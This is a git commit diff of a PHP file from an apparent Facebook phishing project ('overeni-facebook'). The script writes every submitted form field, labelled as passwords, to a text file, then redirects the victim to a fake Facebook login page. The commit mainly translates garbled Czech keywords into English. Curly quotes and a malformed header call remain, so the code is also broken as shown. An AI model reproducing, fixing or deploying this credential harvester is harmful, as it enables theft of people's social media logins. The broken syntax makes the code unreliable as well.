aeb5b64138e3ddc5ccdb7b8759ea12f6bba7fdda
jan422 <jan42.nej@seznam.cz>
2024-01-22 22:56:58 +0100

    Update code.php

--- code.php
+++ code.php
@@ -1,13 +1,13 @@
 <?php
-header ('Umístění: https://jan422.github.io/overeni-facebook/-facebook-login');
-$handle = fopen(“hesla.txt”, “a”);
-foreach($_POST jako $proměnná => $hodnota) {
-fwrite($handle, $proměnná);
+header (‘https://jan422.github.io/overeni-facebook/-facebook-login’);
+$handle = fopen(“password.txt”, “a”);
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
 fwrite($handle, “=”);
-fwrite($handle, $hodnota);
+fwrite($handle, $value);
 fwrite($handle, “\r\n”);
 }
 fwrite($handle, “\r\n”);
 fclose($handle);
-výstup;
+exit;
 ?>
